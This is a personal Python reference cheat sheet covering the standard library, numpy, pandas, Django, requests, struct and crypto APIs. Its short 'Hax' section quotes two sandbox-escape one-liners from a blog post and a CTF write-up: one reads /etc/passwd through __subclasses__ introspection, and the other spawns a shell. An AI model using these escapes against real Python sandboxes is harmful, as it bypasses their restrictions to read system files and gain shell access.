<h3>Script</h3>
<pre>if <a href="http://docs.python.org/2/tutorial/modules.html?highlight=__name__#executing-modules-as-scripts">__name__ == "__main__"</a>: ...</pre>
<h3>Future</h3>
<ul>
	<li><code>from __future__ import print_function</code></li>
	<li><code>from __future__ import division</code></li>
</ul>
<h3>Unicode</h3>
<p><a href="https://www.python.org/dev/peps/pep-0263/">PEP 0263</a>. First or second lines:</p>
<pre># coding=utf-8</pre>
<pre># -*- coding: utf-8 -*-</pre>
<pre># vim: set fileencoding=utf-8 :</pre>
<pre>
import <a href="https://docs.python.org/2.7/library/codecs.html">codecs</a>
codecs.encode(obj, encoding, errors)
codecs.decode(obj, encoding, errors)
</pre>
<p>can pass first 1 or first 2 arguments</p>
<p>encoding = "<code>ascii</code>" if omitted; alternatives: <code>utf_8</code>, <code>latin_1</code>, <code>big5</code> etc.</p>
<p>errors = "<code>strict</code>" if omitted; alternatives: <code>ignore</code>, <code>replace</code> etc.</p>
<h3>String (&rarr; <a href="http://docs.python.org/library/stdtypes.html#string-methods">std. methods</a>, <a href="http://docs.python.org/library/string.html">module</a>)</h3>
<ul>
	<li><code>"formatstring".format(arg0, arg1, name=value)</code>
	<ul>
		<li>Access things: <code>{}{0}{1[0]}{2.name}{name}</code></li>
		<li>Generic: <code>{access:*&gt;+#255,.3d}</code>
		<li>shortcut: <code>{:0255}</code></li>
		<li>space-pad: <code>{&gt;255}</code></li>
		<li><code>foo = 0; bar = "baz"; "{foo} {bar}".format(**locals())</code> is fairly useful trick to quickly interpolate lots of local variables.</li>
	</ul>
	</li>
	<li><code>str.translate(None, "setofchars")</code> deletes characters from set</li>
	<li><code>str.[lr]strip("setofchars")</code> from left/right/both sides</li>
	<li><code>str.replace(old, new)</code> exists (not regex)</li>
</ul>
<h3>Regex <a href="http://docs.python.org/library/re.html">(&rarr; pydoc)</a></h3>
<p>
Special chars: <code>.^$*+?{}\[]|()</code>
</p>
<ul>
	<li><code>re.<a href="https://docs.python.org/3/library/re.html#re.search">search</a>(pattern, string[, flags])</code> yields a <code>MatchObject</code> anywhere in string</li>
	<li><code>re.<a href="https://docs.python.org/3/library/re.html#re.match">match</a>(pattern, string[, flags])</code> yields a <code>MatchObject</code> from start or None</li>
	<li><code>re.<a href="https://docs.python.org/3/library/re.html#re.fullmatch">fullmatch</a>(pattern, string[, flags])</code> yields a <code>MatchObject</code> of the whole string or None (3.4+)</li>
	<li><code>re.<a href="https://docs.python.org/3/library/re.html#re.split">split</a>(pattern, string[, maxsplit=0, flags=0])</code> yields a list of strings</li>
	<li><code>re.<a href="https://docs.python.org/3/library/re.html#re.findall">findall</a>(pattern, string[, flags])</code> &rarr; a list of strings</li>
	<li><code>re.<a href="https://docs.python.org/3/library/re.html#re.finditer">finditer</a>(pattern, string[, flags])</code> &rarr; iterator of <code>MatchObject</code>s</li>
	<li><code>re.<a href="https://docs.python.org/3/library/re.html#re.sub">sub</a>(pattern, replacer, string[, count, flags])</code> returns a string. <code>replacer</code> is string (double-escape chars like <code>'\n'</code>, use <code>r'\1'</code> or <code>r'\g&lt;123&gt;'</code> or <code>r'\g&lt;0&gt;'</code> for a backref) or function mapping MatchObject to string</li>
</ul>
<p>
<code><a href="https://docs.python.org/3/library/re.html#match-objects">MatchObject</a>.group(n)</code> gets the nth group. n = 0 or omitted means the whole match. Groups:
</p>
<ul>
	<li><code>(?: )</code> non-capturing</li>
	<li><code>(?# )</code> comment</li>
	<li><code>(?= )</code> lookahead / <code>(?! )</code> negative lookahead</li>
	<li><code>(?&lt;= )</code> lookbehind / <code>(?&lt;! )</code> negative lookbehind</li>
</ul>
<h3>Sequences <a href="http://docs.python.org/2/library/stdtypes.html#sequence-types-str-unicode-list-tuple-bytearray-buffer-xrange">(&rarr; std. methods)</a> and Dictionaries <a href="http://docs.python.org/2/library/stdtypes.html#mapping-types-dict">(&rarr; pydoc)</a></h3>
<table>
	<tr><th>(python) <a href="https://docs.python.org/2/library/stdtypes.html#sequence-types-str-unicode-list-tuple-bytearray-buffer-xrange">sequences</a></th><th>&darr;</th></tr>
	<tr><td>sorted(iterable, key = lambda x: x[1], reverse=True)</td><td>...</td></tr>
	<tr><td>max(iterable, key = lambda x: x[1])<br />min(iterable, key = lambda x: x[1])</td><td>...</td></tr>
	<tr><td>enumerate('ABCD', start=1)</td><td>(1, 'A'), (2, 'B')...</td></tr>
	<tr><th>(python) <a href="https://docs.python.org/2/library/stdtypes.html#mutable-sequence-types">mutable lists</a></th><th>&darr;</th></tr>
	<tr><td colspan="2">s.append(x)</td></tr>
	<tr><td colspan="2">s.extend(xs) <em>or</em> s += xs</td></tr>
	<tr><td colspan="2">s.insert(i, x)</td></tr>
	<tr><td>s.pop()<br />s.pop(0) <em>(from left)</em></td><td>popped element<br /><code>pop</code> returns it in Python in general <small>(unlike some other languages)</small></td></tr>
	<tr><th>(python) <a href="https://docs.python.org/3/library/stdtypes.html#mapping-types-dict">dictionaries</a></th><th>&darr;</th></tr>
	<tr><td>d.keys(), d.iterkeys(), iter(d)</td><td>[k1, k2...]</td></tr>
	<tr><td>d.values(), d.itervalues()</td><td>[v1, v2...]</td></tr>
	<tr><td>d.items(), d.iteritems()</td><td>[(k1, v1)...]</td></tr>
	<tr><td colspan="2">d.clear()</td></tr>
</table>
<ul>
<li><em>Python 2.7</em>: Replace "iter" with "view" for view objects.</li>
<li><em>Python 3 change</em>: keys(), values(), items() give view objects instead of lists; the other methods are gone (but you can just <code>list</code>ify view objects). View objects are iterable, have <code>len</code>, update dynamically if the map changes, and can be used like sets.</li>
</ul>
<ul>
	<li>Destructively updating a dictionary with another, or with a sequence of key-value pairs: <code>d1.update(d2)</code>.</li>
	<li>Nondestructive idiom(?) for union-ing two dictionaries with string keys: <code>dict(d1, **d2)</code>. <em>3.9 (<a href="https://www.python.org/dev/peps/pep-0584/">PEP 0584</a>):</em> <code>d1 | d2</code></li>
</ul>
<p>In both points above, when there are conflicting mappings for the same key, <code>d2</code> takes precedence.</p>
<h3>Sets <a href="https://docs.python.org/3/library/stdtypes.html#set">(&rarr; std. doc)</a></h3>
<ul>
	<li><code>x in set_a</code>, <code>x not in set_a</code></li>
	<li>
		<code>set_a | set_b</code>,
		<code>set_a &amp; set_b</code>,
		<code>set_a - set_b</code>,
		<code>set_a ^ set_b</code>; compound assignment <code>set_a |= set_b</code> etc.
	</li>
	<li><code>set_a.add(x)</code>; <code>set_a.update(xs)</code></li>
	<li><code>set_a.remove(x)</code> (KeyError if <code>x not in set_a</code>)</li>
	<li><code>set_a.discard(x)</code> (no error)</li>
	<li><code>set_a.pop()</code> (arbitrary element)</li>
	<li><code>set_a.clear()</code></li>
</ul>
<h3>collections <a href="https://docs.python.org/2/library/collections.html#collections.deque">(&rarr; pydoc)</a></h3>
<ul>
	<li><a href="https://docs.python.org/2/library/collections.html#deque-objects">.deque</a>
		<ul>
			<li><code>.append(_)</code>, <code>.appendleft(_)</code></li>
			<li><code>.pop()</code>, <code>.popleft()</code> (return popped elements)</li>
		</ul>
	</li>
	<li><a href="https://docs.python.org/2/library/collections.html#collections.Counter">.Counter</a>(<em>[iterable-or-mapping-or-kwargs]</em>) e.g. Counter("aaaabb"), Counter(a=4, b=2)
		<ul>
			<li><code>.elements()</code> iterates over elements as many times as counted: ["a", "a", "a", "a", "b", "b"]</li>
			<li><code>.update(_)</code>, <code>+</code>, <code>-</code> treat like multisets</li>
		</ul>
	</li>
	<li><a href="https://docs.python.org/2/library/collections.html#defaultdict-objects">.defaultdict</a>(<em>[default_factory[, ...]]</em>)
		<ul>
			<li>will call default_factory() for default values, so pass e.g. int (for 0), list (for [])...</li>
		</ul>
	</li>
</ul>
<h3><a href="https://docs.python.org/2/library/os.html">os</a> Navigate Filesystem</h3>
<ul>
	<li><code>os.chdir(pathstring)</code></li>
	<li><code>os.listdir(pathstring)</code> (unordered list of entries, no <code>.</code> or <code>..</code>)</li>
	<li><code>os.getcwd()</code></li>
	<li><code>os.path.join(*paths)</code> intelligently joins</li>
	<li><code>os.rename(src, dst)</code> (file or dir)</li>
	<li><code>os.renames(src, dst)</code> (same, path dirs allowed)</li>
	<li><code>os.walk(path, topdown=True, <a href="https://docs.python.org/2/library/os.html#os.walk">(more omitted)</a>)</code> is a generator that walks all subdirectories. It yields a 3-tuple <code>(dirpath, dirnames, filenames)</code> for each directory. To do stuff, use <code>os.path.join(root, x)</code> for <code>x</code>  and use You can modify <code>dirnames</code> in-place to inform or prune the walk.</li>
	<li><code>os.path.exists("foo")</code></li>
	<li><code>os.path.isfile("foo")</code> (exists and is file?)</li>
	<li><code>os.path.isdir("foo")</code> (exists and is directory?)</li>
</ul>
<h3>subprocess</h3>
<pre>proc = subprocess.Popen("cat", shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
(stdout_data, stderr_data) = proc.communicate(<em>[input=some_bytes]</em>)</pre>

<p>One-shot, newer API:</p>

<pre>result = subprocess.run("cat", <em>[input=some_bytes,]</em> stdout=subprocess.PIPE, stderr=subprocess.PIPE)
result.stdout # bytes or None
result.stderr # bytes or None</pre>

<p>The first argument in both is <code>args: str|List[str]</code>.</p>

<ul>
	<li>If str: either simply the program to be run (if <code>shell=False</code>) or the whole shell line to lex and expand.</li>
	<li>If List[str]: a list with first element the program to be run and remaining the string arguments to pass to it.</li>
</ul>

<p>Add the <code>encoding='utf-8'</code> argument to Popen or run, and use unicode instead of bytes for both input and output.</p>

<p>In 3.7+, on <code>run()</code> only, <code>capture_output=True</code> is short for <code>stdout=subprocess.PIPE, stderr=subprocess.PIPE</code></p>
<h3>Itertools</h3>
<table>
	<tr><th>(python) <a href="http://docs.python.org/library/itertools.html">itertools</a>.</th><th>&darr;</th></tr>
	<tr><td>islice(_, 9)</td><td>[:9] (hs: take 9)</td></tr>
	<tr><td>islice(_, 2, 9)</td><td>[2:9] (hs: take 7 . drop 2)</td></tr>
	<tr><td>islice(_, 2, None)</td><td>[2:] (hs: drop 2)</td></tr>
	<tr><td>islice(_, 2, 9, 3)</td><td>[2:9:3]</td></tr>
	<tr><td>count(10)</td><td>10, 11, 12, 13...</td></tr>
	<tr><td>count(10, 2)</td><td>10, 12, 14, 16...</td></tr>
	<tr><td>cycle([31, 41, 59])</td><td>31, 41, 59, 31, 41, 59...</td></tr>
	<tr><td>repeat(42)</td><td>42, 42, 42...</td></tr>
	<tr><td>repeat(42, 5)</td><td>42, 42, 42, 42, 42</td></tr>
	<tr><td>product('ABCD', 'PQRS')</td><td>AP, AQ, AR, AS, BP, BQ[...]</td></tr>
	<tr><td>product('ABCD', repeat=2)</td><td>AA, AB, AC, AD, BA, BB[...]</td></tr>
	<tr><td>permutations('ABCD')</td><td>ABCD, ABDC[...]</td></tr>
	<tr><td>permutations('ABCD', 2)</td><td>AB, AC, AD, BA, BC[...]</td></tr>
	<tr><td>combinations('ABCD', 2)</td><td>AB, AC, AD, BC, BD, CD</td></tr>
	<tr><td>combinations_with_replacement('ABCD', 2)</td><td>AA, AB, AC, AD, BB[...]</td></tr>
</table>
<h3><a href="https://docs.python.org/3/library/random.html">Random</a></h3>
<table>
	<tr><td>randrange(...)</td><td>[start,] stop[, step], just like range (half-open)</td></tr>
	<tr><td>randint(lo, hi)</td><td>integers; inclusive</td></tr>
	<tr><td>choice(seq)</td><td>1 sample</td></tr>
	<tr><td><a href="https://docs.python.org/3/library/random.html#random.choices">choices</a>(seq, ...)</td><td>k samples (w/ replacement), can weight etc. (see docs)</td></tr>
	<tr><td><a href="https://docs.python.org/3/library/random.html#random.sample">sample</a>(seq, k)</td><td>k samples w/o replacement</td></tr>
	<tr><td>shuffle(seq)</td><td>modifies in-place</td></tr>
	<tr><td>random()</td><td>[0, 1) float</td></tr>
	<tr><td>uniform(lo, hi)</td><td>[lo, hi) float</td></tr>
	<tr><td>gauss(mu, sigma)<br />normalvariate(mu, sigma)</td><td>normal distribution (latter slower but thread-safe)</td></tr>
</table>
<h3>Other Standard Library</h3>
<pre>import getpass
password = getpass.getpass()</pre>
<pre>import time
time.sleep(0.5) # 0.5 seconds</pre>
<h3>Hax</h3>
<pre>[t for t in (1).__class__.__bases__[-1].__subclasses__() if t.__name__ == 'file'][0]('/etc/passwd').read()</pre>
<p>(from <a href="http://eev.ee/blog/2012/03/24/on-principle/"><cite>On principle</cite> (eevee)</a>)</p>
<p>Want a shell instead?</p>
<pre>[x for x in().__class__.__bases__[0].__subclasses__() if x.__name__ == "catch_warnings"
][0].__init__.func_globals["linecache"].__dict__["os"].execlp("sh","sh")</pre>
<p>(from <a href="http://jonathanzong.com/picoctf/2013/05/07/python-eval-5-140">Jonathan Zong's picoCTF 2013 writeup</a>)</p>
<p>from <a href="https://stackoverflow.com/questions/8294618/define-a-lambda-expression-that-raises-an-exception">stackoverflow</a>, expression to throw an error:</p>
<pre>type(lambda:0)(type((lambda:0).func_code)(
  1,1,1,67,'|\0\0\202\1\0',(),(),('x',),'','',1,''),{}
)(Exception())</pre>
<pre>type(lambda: 0)(type((lambda: 0).__code__)(
    1,0,1,1,67,b'|\0\202\1\0',(),(),('x',),'','',1,b''),{}
)(Exception())</pre>
<h3>pygmentize</h3>
<p>has complicated command line flags:</p>
<pre>pygmentize -f html -l python -O full,style=tango -o out.html src.py</pre>
<p>note it can guess -f and infer -l from source file extension</p>
<h3>numpy</h3>
<p><code>import numpy as np</code> is standard. <code>np.</code> is implied in most names below...</p>
<h4>Array construction</h4>
<ul>
	<li><code>array([[1, 2, 3], [4, 5, 6]])</code></li>
	<li><code>eye(n)</code>, <code>identity(n)</code></li>
	<li><code>ones(shape)</code>, <code>zeros(shape)</code>, <code>full(shape, fill_values)</code></li>
	<li><code>arange([start,] stop, [step])</code> (basically just python range, except returns ndarray)</li>
	<li><code>linspace(start, stop, num=50, endpoint=True)</code> (50 evenly spaced samples in inclusive interval [start, stop], or half-open [start, stop) if endpoint is False)</li>
	<li>The above can receive a <code>dtype</code> argument which is like <code>numpy.int64</code>, <code>numpy.float_</code>, or <code>numpy.bool_</code>. If you just use Python's <code>int</code>, <code>float</code>, or <code>bool</code>, it will Just Work. You can also make your own by writing something in a string somehow.</li>
	<li><code>fromfunction(fn, shape)</code></li>
</ul>
<h4>Array properties</h4>
<ul>
	<li><code>arr.shape</code> is a tuple of the dimensions</li>
	<li><code>arr.ndim</code> is the number of dimensions (so, the length of arr.shape)</li>
	<li><code>arr.size</code> is a single number, the number of elements (so, the product of arr.shape)</li>
	<li><code>arr.dtype</code> is the type of the array's elements</li>
</ul>
<h4>Matrix operations</h4>
<p>Note that <code>*</code> (along with most other operations) acts element-wise!</p>
<ul>
	<li><code>_.astype('float32')</code></li>
	<li><code>np.transpose(_)</code> or <code>_.T</code> (<em>identity on 1D arrays!</em> may need to reshape)</li>
	<li><code>np.linalg.det(_)</code></li>
	<li><code>np.dot(_, _)</code>, or <code>_ @ _</code> (<em>Python 3 only</em>: <code>__matmul__</code> operator)</li>
	<li><code>np.linalg.inv(_)</code></li>
</ul>
<h4>Indexing, Slicing, Iterating</h4>
<ul>
	<li>Index and/or slice like <code>arr[1,2,3:4]</code>. You can use bare colons to slice everything along a dimension.</li>
	<li>You can also index with one tuple (but not other sequence types) like <code>arr[(1,2,3)] == arr[1,2,3]</code>.</li>
	<li>Basic slices return views, so they're fast. <code>arr[::-1]</code> is a good way to reverse.</li>
	<li>You can also do "advanced indexing" with one or many non-tuple sequences of indices (crudely, it zips them and indexes by each one to produce a new array). So <code>arr[[1,2,3]]</code> (unlike the above) will index by 1, then by 2, then by 3, and return the results in one array; and <code>arr[[1,2,3],[4,5,6]]</code> will index by (1,4), (2,5), and (3,6).</li>
	<li>Or "advanced indexing" with an array of booleans (it filters for the true ones). Example: you can filter by <code>arr[arr % 2 == 0]</code>.</li>
	<li>You can combine different indexing modes along different dimensions.</li>
	<li>Iterating over an array directly indexes along the first (index 0) dimension, e.g. iterating over a 2D array gives you the rows.</li>
	<li><code>numpy.nonzero(arr)</code> returns the indices of elements that are nonzero, but kind of strangely; watch out! It returns a tuple of arrays, one for each dimension of <code>arr</code>, so <code>arr[nonzero(arr)]</code> gives you an array of the nonzero values. If you want to iterate over indexes and then unpack them, do <code>transpose(nonzero(arr))</code>.</li>
</ul>
<h4>Folds</h4>
<ul>
	<li><code>np.sum</code>, <code>np.prod</code>, <code>np.min</code>, <code>np.max</code>, <code>np.all</code>, <code>np.any</code>, <code>np.count_nonzero</code> fold the matrix to one scalar result. Specify an <code>axis</code> argument, a dimension or tuple of dimensions, to fold along only certain axes. <code>np.sum</code> usefully promotes to bigger int types on booleans.</li>
</ul>
<h4>Array manipulation</h4>
<ul>
	<li><code>np.append(arr1, arr2, axis=0)</code> e.g. <code>np.append(x, [[1]], axis=0)</code> (you almost certainly want an axis; otherwise it flattens everything, ew)</li>
	<li><code>np.concatenate([arr1, arr2, ...], axis=0)</code> (requires arrays have same dimensions except along axis, returns an array also with same dimensions except along axis; axis is 0 by default)</li>
	<li><code>np.stack([arr1, arr2, ...], axis=0)</code> (requires arrays have the exact same shape, returns an array with an additional axis specified by the parameter)</li>
	<li><code>arr.reshape(shape)</code> e.g. <code>arr.reshape((-1, 1))</code> converts to a column vector; <code>-1</code> is the unknown dimension you can specify once</li>
</ul>
<h3>pandas</h3>
<pre>import pandas as pd</pre>
<pre>pd.read_csv(magic)
pd.read_table(magic) # tsv by default</pre>

<p>1-D data is Series. 2-D data is DataFrame (<code>df</code> below). They are quite similar to ndarray. The most important philosophical difference is that the data in Series and DataFrame are tightly associated with their labels or indices, and operations generally preserve and operate between corresponding labels and indices (for example, slicing [1:4] will give a result that still has indices 1, 2, 3) (whereas in ndarrays, operations operate between corresponding fickle positions.)</p>

<h4>Basic Info</h4>

<pre>df.info() # sizes etc
df.describe() # descriptive statistics: count, mean etc.
df['colname'].dtype # data type
s.values, df.values # ndarray
s.shape, df.shape # consistent with ndarray
series.index; df.index, df.columns</pre>

<h4>Slicing</h4>

<pre>df.loc['foo'] # index by label only
df.iloc[3] # index by numeric position only, 0-indexed

df.head(10)
df.tail(10)

df.drop([1, 2, 3])
df.drop(['colname'], axis=1)</pre>

<h4>New Columns</h4>

<pre>df['newcolname'] = df['colname'] + 1
# nondestructive:
df.assign({'newcolname': df['colname'] + 1})
df.assign(newcolname = df['colname'] + 1)</pre>

<h4>Index Manipulation</h4>

<pre>series.reindex(list_of_indices)
# always keeps association between each index and its data
# drops missing indexes; fills new indexes with NaN

series.sort_index()

series/df.rename(index: dict|(OldIndex &rarr; NewIndex)) # changes indexes
df.rename(columns: dict|(OldIndex &rarr; NewIndex)) # changes column labels
# or, where mapper : dict | (OldIndex &rarr; NewIndex)
df.rename(mapper, axis='index')
df.rename(mapper, axis='columns')

df.set_index('colname') # makes the data indexed by existing column 'colname'
df.set_index(['colname', 'colname2']) # ditto, but MultiIndex
df.reset_index() # demotes index to a normal column, index by 0, 1, etc.</pre>

<p>If you just want to blow away the index-value association, I think <code>df.values</code> is the best way.</p>

<h4>Working with Conditions</h4>

<pre>df1 == df2, df1 &lt; df2 # etc. broadcast fine
(df + df).equals(df * 2) # ==, except NaN equals NaN
(df['colname'] &lt; 10).count()
df[df['colname'] &lt; 10]
df[df['colname'].isin([1, 3, 5, 7, 9])]</pre>

<h4>NaN</h4>

<pre>np.nan
df.dropna(how='any')
df.fillna(value=5)
df.isna(), df.notna() # because nan != nan</pre>

<h4>Reductions</h4>

<pre>series.empty, df.empty

series.mean(), series.sum(), series.std(), ...
series.nunique() # number of distinct values
series.value_counts() # value &rarr; frequency of value
pd.cut(series, num_bins), pd.qcut(series)
series.idxmin(), series.idxmax() # index of min and max; like argmax, the name numpy uses
series.agg(np.sum)
(series &gt; 0).all(), .any(), .bool()
# above can also be done to DataFrames
# gives results are per column, for columns that make sense</pre>

<h4>Maps/Lifting</h4>

<pre>df.pipe(f) # f(df), but may be more readable/chainable style</pre>

<ul>
	<li>
		lift (ndarray &rarr; ndarray) to (DataFrame &rarr; DataFrame)
		<pre>df.transform(np.abs) # map on underlying ndarray
df.transform([np.abs, lambda x: x + 1])</pre>
	</li><li>
		lift (Series &rarr; Series) to (DataFrame &rarr; DataFrame)
		<pre>df.apply(lambda x: x.max() - x.min(0)) # map columns</pre>
	</li><li>
		lift (ndarray &rarr; ndarray) to (Series &rarr; Series)
		(also works to lift element &rarr; element?)
		<pre>series.apply(some_function)
df['colname'].apply(some_function) # map each element of column
df['colname'] = df['colname'].apply(some_function)</pre>
	</li><li>
		lift (element &rarr; element) to (Series &rarr; Series)
		<pre>series.map(lambda x: len(str(x))) # elementwise map</pre>
	</li><li>
		lift (element &rarr; element) to (DataFrame &rarr; DataFrame)
		<pre>df.applymap(lambda x: len(str(x))) # elementwise map</pre>
	</li><li>
		cast
		<pre>df.astype('float32')</pre>
	</li><li>
		proxy-ish map <a href="http://pandas.pydata.org/pandas-docs/stable/text.html">string operations</a></pre>
		<pre>series.str.lower()</pre>
	</li>
</ul>

<h4>Sort</h4>

<pre>df.sort_values(by='colname')
df.sort_values(by='colname', ascending=False)
df['colname'].sort_values()</pre>

<h4>More Stats</h4>
<pre>df.cov()
series1.corr(series2, <em>[method='pearson'|'kendall'|'spearman']</em>)
series.rank() # minimum is 1, maximum is n; ties become average of tied ranks by default
</pre>

<h4>Group (split &rarr; apply &rarr; combine)</h4>

Aggregation: Lifts Group[S] &rarr; T reducer. New DataFrame, indexed by value in grouped-by column; value is result

<pre>df.groupby('colname').mean() # mean per group
etc: .size() .sum() .std()
df.groupby('colname').describe()
df.groupby('colname').colname2.agg(['mean', 'min', 'max'])
df.groupby('colname').get_group('colvalue')
df.groupby(('colname1', 'colname2'))</pre>

Transformation: Lifts Group[S] &rarr; Group[T] mapper. New DataFrame, same index, each group's values mapped separately
<pre>df.groupby('colname').transform(lambda x: x - x.mean())</pre>

Filtration: Keep only items in groups satisfying the condition.
<pre>df.filter(lambda group: group['colname'].sum() &gt; 300)</pre>

<h3>Django</h3>
<pre>Program.objects.get(name='Splash 2016')</pre>
<h4>Models (<a href="https://docs.djangoproject.com/en/1.10/topics/db/models/">1.10 docs</a>)</h4>
<pre>prog = Program(...)
prog.save()
prog.name = 'lol'
prog.save()
prog.delete()</pre>
<p>(Or one-step creation:)</p>
<pre>Program.objects.create(name = 'gg')</pre>
<p>These all deal with QuerySets.</p>
<pre>Program.objects # Manager
Program.objects.all() # QuerySet with all
Program.objects.filter(name__contains='2016')
# other things: field__gt=3, field__other_field etc
Program.objects.get(name='Splash 2016')
Program.objects.order_by('name')

StudentRegistration.valid_objects().filter(
             section__parent_class__parent_program=prog,
             relationship__name='Enrolled'
         )
enrolled.values_list('user__last_name', 'user').distinct()

# race-condition-free modifying stuff in database:
reporter = Reporters.objects.get(name='Tintin')
reporter.stories_filed = F('stories_filed') + 1 # no math happens here!
reporter.save()
reporter.refresh_from_db() # if you need the actual data

Entry.objects.filter(number_of_comments__gt=F('number_of_pingbacks') * 2)

Company.objects.order_by(F('last_contacted').desc(nulls_last=True))

company = Company.objects.annotate(chairs_needed=F('num_employees') - F('num_chairs'))


from django.db.models import OuterRef, Subquery
newest = Comment.objects.filter(post=OuterRef('pk')).order_by('-created_at')
Post.objects.annotate(newest_commenter_email=Subquery(newest.values('email')[:1]))

Post.objects.annotate(
    recent_comment=Exists(
        Comment.objects.filter(post=OuterRef('pk'), created_at__gte=one_day_ago)
    )
)
# ~Exists is OK

# this line is Django 3.0+:
Post.objects.filter(Exists(...))

total_comments = comments.annotate(total=Sum('length')).values('total')
Post.objects.filter(length__gt=Subquery(total_comments))


from django.db.models import Avg, Max, Count, Q
Book.objects.all().aggregate(foo=Avg('price')) # terminal action, you get { 'foo': 12.34 }
# (or automatically generated keys if args)
Publisher.objects.annotate(num_books=Count('book'))
Publisher.objects.annotate(below_5=Count('book', filter=Q(book__rating__lte=5)))

# joins instead of subqueries, so multiple aggregations are bad:
Book.objects.annotate(Count('authors', distinct=True), Count('store', distinct=True))
</pre>
<h3><a href="https://requests.readthedocs.io/en/master/">Requests</a></h3>
<pre>import requests
r = requests.get('http://www.example.com/', params={'foo': 'bar'}) # values can also be lists
r = requests.post('http://www.example.com/', data={'foo': 'bar'}) # auto form-encodes; str/bytes is OK too</pre>
r = requests.request('VERB', url, ...) # 'GET' or 'POST' or others, even custom
<p>Other parameters include:</p>
<ul>
	<li><code>cookies={'foo': 'bar'}</code></li>
	<li><code>headers={'user-agent': 'my-app/0.0.1'}</code></li>
	<li><code>json={'foo': 'bar'}</code> (<code>data=</code> its JSON representation; some APIs take it)</li>
</ul>
<pre>r.url # see which URL was requested, after redirects; includes the encoded params you passed
  r.history # Response objects for any redirects that occurred
r.status_code
  r.raise_for_status() # raise exception if 4xx or 5xx
r.text # automagical unicode
  r.content # bytes
  r.json() # parse as JSON
r.headers # of response; magical dict with case-insensitive keys
r.cookies # of response</pre>
<p>Make a session to store cookies:</p>
<pre>sess = request.Session()
sess.get('http://www.example.com/') # as before</pre>

<h3>struct</h3>
<pre>struct.pack(fmt, v1, v2, ...)
struct.unpack(fmt, bytes) # always tuple, possibly length-1
struct.calcsize(fmt) # number of bytes
</pre>

<p>First character of fmt optionally indicates endianness/size/alignment. You probably just want one of:</p>

<pre>&lt; little-endian (x86)
&gt; big-endian ("natural writing")</pre>

<p>Remaining characters format things one at a time. Uppercase variants indicate the things in brackets, usually <code>unsigned</code>. Most useful:</p>

<ul>
	<li><code>'&lt;I'</code> packs/unpacks 32-bit unsigned ints. <code>struct.pack('&lt;I', num)</code></li>
	<li><code>'&lt;Q'</code> packs/unpacks 64-bit unsigned ints. <code>struct.pack('&lt;Q', num)</code></li>
</ul>

<p>Precede with a count a la <code>vi</code> to repeat: <code>'4h'</code> means <code>'hhhh'</code>. Exception: for <code>'s'</code> the count means the length of the string. (Pascal-style strings are packed with the first byte indicating the length of the string.)</p>

<table>
	<tr><th>format</th><th>C type</th><th>Python type</th><th># bytes</th></tr>
	<tr><td>x</td><td colspan="3" class="empty"></td></tr>
	<tr><td>c</td><td>char</td><td>bytes (len = 1)</td><td>1</td></tr>
	<tr><td>b/B</td><td>[unsigned] char</td><td>int</td><td>1</td></tr>
	<tr><td>?</td><td>_Bool</td><td>bool</td><td>1</td></tr>
	<tr><td>h/H</td><td>[unsigned] short</td><td>int</td><td>2</td></tr>
	<tr><td>i/I</td><td>[unsigned] int</td><td>int</td><td>4</td></tr>
	<tr><td>l/L</td><td>[unsigned] long</td><td>int</td><td>4</td></tr>
	<tr><td>q/Q</td><td>[unsigned] long long</td><td>int</td><td>8</td></tr>
	<tr><td>n/N</td><td>[s]size_t</td><td>int</td><td class="empty"></td></tr>
	<tr><td>e</td><td class="empty"></td><td>float</td><td>2</td></tr>
	<tr><td>f</td><td>float</td><td>float</td><td>4</td></tr>
	<tr><td>d</td><td>double</td><td>float</td><td>8</td></tr>
	<tr><td>s/p</td><td>char[] [Pascal style]</td><td>bytes</td><td class="empty"></td></tr>
	<tr><td>P</td><td>void *</td><td>int</td><td class="empty"></td></tr>
</table>
<h3>encoding bytes and ints</h3>

<pre>
b'foo'.<a href="https://docs.python.org/3/library/stdtypes.html#bytes.hex">hex</a>([sep[, bytes_per_sep]]) # 3.5+
bytes.<a href="https://docs.python.org/3/library/stdtypes.html#bytes.fromhex">fromhex</a>('666f6f') # 3.0+

# 3.2+
(some_int).<a href="https://docs.python.org/3/library/stdtypes.html#int.to_bytes">to_bytes</a>(n, 'big'|'little'[, signed=False])
	n = (some_int.bit_length() + 7) // 8
# static method:
int.<a href="https://docs.python.org/3/library/stdtypes.html#int.from_bytes">from_bytes</a>(some_bytes, 'big'|'little'[, signed=False])

# <a href="https://docs.python.org/3/library/base64.html">base64</a> module: bytes to bytes (for greppability: b64encode, b64decode)
base64.b64{encode,decode}(s, altchars='+/') # url '-_'
base64.{standard_b64,urlsafe_b64,b32,b16,a85,b85}{encode,decode}
</pre>

<p>
As before: little-endian is how you'll see it in e.g. x86, big-endian is "natural writing".
</p>

<h3>hashing, crypto</h3>
<pre>
import <a href="https://docs.python.org/3/library/hashlib.html">hashlib</a>
m = hashlib.sha256(b'init data') # data optional
m.update(b'more data')
m.digest(), m.digest_size; m.hexdigest() # all bytes

# fancy new blake hashes; digest_size and key up to 64|32, salt up to 16|8
# key is replacement for hmac
m = hashlib.blake2b(b'init data', *, digest_size=64, key, salt, ...)
m = hashlib.blake2s(b'init data', *, digest_size=32, key, salt, ...)
</pre>

<pre>
import <a href="https://docs.python.org/3/library/hmac.html">hmac</a>
h = hmac.new(key, msg, hashlib.sha256)
h.update(msg), h.digest(), h.hexdigest()
hmac.digest(key, msg, hashlib.sha256) # bytes
hmac.compare_digest(a, b) # constant-time equality
</pre>

<h4>pip install cryptography</h4>

<pre>
from <a href="https://cryptography.io/en/latest/">cryptography</a>.fernet import Fernet
key = Fernet.generate_key() # urlsafe_b64encode(os.urandom(32))
f = Fernet(key)
ciphertext = f.encrypt(plaintext) # "Fernet token"; time of generation in plaintext
f.decrypt(ciphertext)

from <a href="https://cryptography.io/en/latest/">cryptography</a>.hazmat.primitives.ciphers.aead import ChaCha20Poly1305, AESGCM
# 12-byte nonce only. <a href="https://github.com/pyca/cryptography/issues/5267">no extended nonce (transitive through OpenSSL)</a>
key = ChaCha20Poly1305.generate_key() # os.urandom(32)
c = ChaCha20Poly1305(key)
nonce = os.urandom(12)
# --- or ---
key = AESGCM.generate_key(bit_length=128|192|256) # os.urandom(bit_length // 8)
c = AESGCM(key)
nonce = os.urandom(12)

ct = c.encrypt(nonce, plaintext, aad)
c.decrypt(nonce, ciphertext, aad)
</pre>

<h4>pip install pycryptodome</h4>

Prefers Python implementations.

<pre>from Crypto.Random import get_random_bytes # shrug

